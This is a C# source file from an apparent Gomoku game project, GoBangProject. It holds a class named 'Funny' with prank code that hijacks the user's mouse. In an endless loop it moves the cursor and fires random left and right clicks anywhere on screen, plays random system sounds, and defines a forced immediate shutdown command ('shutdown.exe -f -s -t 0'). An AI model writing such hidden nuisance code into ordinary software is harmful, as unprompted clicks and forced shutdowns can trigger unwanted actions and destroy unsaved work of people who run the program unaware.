using System;
using System.Diagnostics;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
//Download by http://www.codesc.net
namespace GoBangProject
{
    class Funny
    {
        private const int MOUSEEVENTF_LEFTDOWN = 0x2;
        private const int MOUSEEVENTF_LEFTUP = 0x4;
        private const int MOUSEEVENTF_MIDDLEDOWN = 0x20;
        private const int MOUSEEVENTF_MIDDLEUP = 0x40;
        private const int MOUSEEVENTF_MOVE = 0x1;
        private const int MOUSEEVENTF_ABSOLUTE = 0x8000;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x8;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")]
        private static extern int SetCursorPos(int x, int y);
        [DllImport("user32.dll")]
        private static extern int mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        private static int Sx, Sy;
        private static long tick = 1;
        private static Random rnd = new Random();

        public static void StartFunny()
        {
            Sx = GetSystemMetrics(0);
            Sy = GetSystemMetrics(1);
            while (true)
            {
                tick += rnd.Next(2);
                if (tick % 643 == 0)
                    DoMouse();
                if (tick % 313 == 0)
                    DoBang();
            }
        }

        private static void DoMouse()
        {
            int dx, dy;
            int c = 4;
            while (c-- > 0)
            {
                dx = rnd.Next(Sx);
                dy = rnd.Next(Sy);
                switch (rnd.Next(3))
                {
                    case 0:
                        SetCursorPos(dx, dy);
                        break;
                    case 1:
                        mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP | MOUSEEVENTF_ABSOLUTE, dx, dy, 0, 0);
                        break;
                    case 2:
                        mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP | MOUSEEVENTF_ABSOLUTE, dx, dy, 0, 0);
                        break;
                }
                Thread.Sleep(500);
            }
        }

        private static void DoBang()
        {
            switch (rnd.Next(4))
            {
                case 0:
                    SystemSounds.Asterisk.Play();
                    break;
                case 1:
                    SystemSounds.Beep.Play();
                    break;
                case 2:
                    SystemSounds.Exclamation.Play();
                    break;
                case 3:
                    SystemSounds.Hand.Play();
                    break;
            }
        }

        private static void DoShutdown()
        {
            Process.Start("shutdown.exe", "-f -s -t 0");
        }
    }
}
